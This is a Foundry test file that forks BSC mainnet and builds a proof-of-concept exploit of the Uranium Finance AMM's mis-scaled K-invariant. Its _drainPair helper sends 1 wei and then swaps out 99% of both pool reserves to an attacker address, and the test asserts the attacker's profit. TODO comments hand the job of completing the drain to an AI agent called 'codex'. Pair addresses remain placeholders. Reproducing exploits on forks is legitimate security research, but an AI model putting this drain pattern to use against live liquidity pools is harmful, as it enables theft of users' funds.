pragma solidity 0.8.23;

import "forge-std/Test.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Minimal local interfaces — Uranium is a Uniswap V2 fork on BSC.
// Keep the surface small per AGENTS.md §7 (faster compile, less attack surface).
// ─────────────────────────────────────────────────────────────────────────────

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function sync() external;
}

interface IUniswapV2Factory {
    function allPairs(uint256) external view returns (address);
    function allPairsLength() external view returns (uint256);
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2Router {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface IWBNB is IERC20 {
    function withdraw(uint256) external;
    function deposit() external payable;
}

contract UraniumExploitTest is Test {
    // ── Addresses (BSC mainnet fork) ──────────────────────────────────
    // Verified addresses from knowledge/case_uranium.md:
    IUniswapV2Factory constant URANIUM_FACTORY = IUniswapV2Factory(0xA943eA143cd7E79806d670f4a7cf08F8922a454F);
    IWBNB             constant WBNB            = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Router  constant PCS_ROUTER      = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // TODO[codex]: fill in the exact pair addresses after recon (factory.allPairs enumeration).
    // Known large Uranium pairs at exploit-era (placeholder — verify via cast):
    address constant PAIR_WBNB_BUSD = address(0); // TODO[codex]: fill
    address constant PAIR_WBNB_USDT = address(0); // TODO[codex]: fill
    address constant PAIR_WBNB_ETH  = address(0); // TODO[codex]: fill

    // ── Setup ────────────────────────────────────────────────────────
    address attacker = vm.addr(uint256(keccak256("attacker")));
    // TODO[codex]: confirm fork block via `cast block-number --rpc-url $RPC_CH1_URANIUM`
    uint256 constant FORK_BLOCK = 6947259; // 2021-04-28 era (placeholder — pin after recon)

    function setUp() public {
        vm.createSelectFork("ch1", FORK_BLOCK);
        vm.deal(attacker, 1 ether); // BNB for gas
    }

    // ── Hypothesis test ──────────────────────────────────────────────
    function test_exploit() public {
        uint256 balBefore = attacker.balance;
        console.log("ATTACKER_NATIVE_BEFORE:", balBefore);

        vm.startPrank(attacker);

        // TODO[codex]: enumerate top-N Uranium pairs and drain each.
        //   1. For each target pair `p`:
        //      - read (r0, r1) via p.getReserves()
        //      - transfer dust (1 wei) of token0 to pair (some pairs may need both sides)
        //      - call p.swap(r0 * 99 / 100, r1 * 99 / 100, attacker, "")
        //      - the broken K invariant (10000**2 vs 1000**2 scale) lets this pass
        //   2. Collect token0/token1 on attacker.
        //   3. Swap non-WBNB tokens → WBNB via PancakeSwap router (or another Uranium pair).
        //   4. Unwrap WBNB → BNB (see _unwrapWBNB helper).
        //
        //   Reference hypothesis from knowledge/case_uranium.md:
        //     - K check is require(bAdj0 * bAdj1 >= r0 * r1 * 10000**2) while bAdjX is 1000-scaled
        //     - → right side 100× inflated but attacker controls left via huge amountOut
        //     - → ~99% reserve drain in a single swap() call

        // Example stub (Codex replaces per pair):
        // _drainPair(PAIR_WBNB_BUSD);
        // _drainPair(PAIR_WBNB_USDT);
        // _drainPair(PAIR_WBNB_ETH);

        _unwrapWBNB();

        vm.stopPrank();

        uint256 balAfter = attacker.balance;
        console.log("ATTACKER_NATIVE_AFTER:", balAfter);
        console.log("ATTACKER_NATIVE_DELTA:", balAfter - balBefore);
        assertGt(balAfter, balBefore, "native balance must strictly increase");
    }

    // ─────────────────────────────────────────────────────────────────
    // Helper: drain a single Uranium pair via the broken-K swap.
    // TODO[codex]: tune the dust input and (amount0Out, amount1Out) fractions
    // so the (still-broken) K inequality holds on both sides.
    // ─────────────────────────────────────────────────────────────────
    function _drainPair(address pair) internal {
        IUniswapV2Pair p = IUniswapV2Pair(pair);
        (uint112 r0, uint112 r1, ) = p.getReserves();
        address t0 = p.token0();

        // Dust input (attacker must already hold ≥ 1 wei of token0 for this to work).
        // TODO[codex]: depending on which side the attacker is funded, pick t0 or t1.
        IERC20(t0).transfer(pair, 1);

        // 99% drain of both reserves in a single call (broken K invariant lets this pass).
        p.swap(uint256(r0) * 99 / 100, uint256(r1) * 99 / 100, attacker, "");
    }

    // Unwrap all WBNB balance back to native BNB on attacker.
    function _unwrapWBNB() internal {
        uint256 wbnbBal = WBNB.balanceOf(attacker);
        if (wbnbBal > 0) {
            WBNB.withdraw(wbnbBal);
        }
    }

    // Allow attacker to receive native BNB from WBNB.withdraw / pair swaps.
    receive() external payable {}

    /// @notice Hypothesis: Uranium's AMM K-invariant check was refactored with a
    ///         scale-mismatch constant (10000**2 on RHS, 1000-scaled adjusted
    ///         balances on LHS), making the invariant pass for swaps that drain
    ///         ~99% of both sides of the pair in a single call. The PoC iterates
    ///         the top-N pairs (by TVL) and sweeps each, then unwraps WBNB to BNB.
    ///         Codex replaces the pair list + dust amounts per attempt.
}
